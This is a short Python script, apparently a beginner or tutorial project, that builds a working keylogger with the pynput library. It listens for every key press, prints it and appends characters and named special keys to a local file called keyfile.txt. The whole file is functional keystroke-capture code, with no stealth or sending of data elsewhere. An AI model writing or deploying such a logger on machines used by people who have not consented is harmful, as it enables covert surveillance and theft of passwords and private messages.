from pynput import keyboard

# Define a mapping for special keys to their string representations
special_keys = {
    keyboard.Key.space: 'SPACE',
    keyboard.Key.enter: 'ENTER',
    keyboard.Key.backspace: 'BACKSPACE',
    keyboard.Key.tab: 'TAB',
    keyboard.Key.esc: 'ESC',
    keyboard.Key.shift: 'SHIFT',
    keyboard.Key.shift_r: 'SHIFT_R',
    keyboard.Key.ctrl: 'CTRL',
    keyboard.Key.ctrl_r: 'CTRL_R',
    keyboard.Key.alt: 'ALT',
    keyboard.Key.alt_r: 'ALT_R',
    keyboard.Key.caps_lock: 'CAPS_LOCK',
    keyboard.Key.cmd: 'CMD',
    keyboard.Key.cmd_r: 'CMD_R',
    keyboard.Key.delete: 'DELETE',
    keyboard.Key.down: 'DOWN',
    keyboard.Key.end: 'END',
    keyboard.Key.f1: 'F1',
    keyboard.Key.f2: 'F2',
    keyboard.Key.f3: 'F3',
    keyboard.Key.f4: 'F4',
    keyboard.Key.f5: 'F5',
    keyboard.Key.f6: 'F6',
    keyboard.Key.f7: 'F7',
    keyboard.Key.f8: 'F8',
    keyboard.Key.f9: 'F9',
    keyboard.Key.f10: 'F10',
    keyboard.Key.f11: 'F11',
    keyboard.Key.f12: 'F12',
    keyboard.Key.home: 'HOME',
    keyboard.Key.insert: 'INSERT',
    keyboard.Key.left: 'LEFT',
    keyboard.Key.page_down: 'PAGE_DOWN',
    keyboard.Key.page_up: 'PAGE_UP',
    keyboard.Key.right: 'RIGHT',
    keyboard.Key.up: 'UP'
}

# Function to handle key press events


def keyPressed(key):
    print(str(key))  # Print the key to the console
    with open('keyfile.txt', 'a') as logKey:  # Open the log file in append mode
        try:
            char = key.char  # Attempt to get the character representation of the key
            logKey.write(char)  # Write the character to the log file
        except AttributeError:
            # Handle special keys
            # Get the name from the mapping or use the default string representation
            key_name = special_keys.get(key, str(key))
            # Write the special key name to the log file
            logKey.write(key_name)


if __name__ == "__main__":
    listner = keyboard.Listener(on_press=keyPressed)  # Set up the key listener
    listner.start()  # Start the key listener
    input()  # Keep the program running to continue listening for key presses
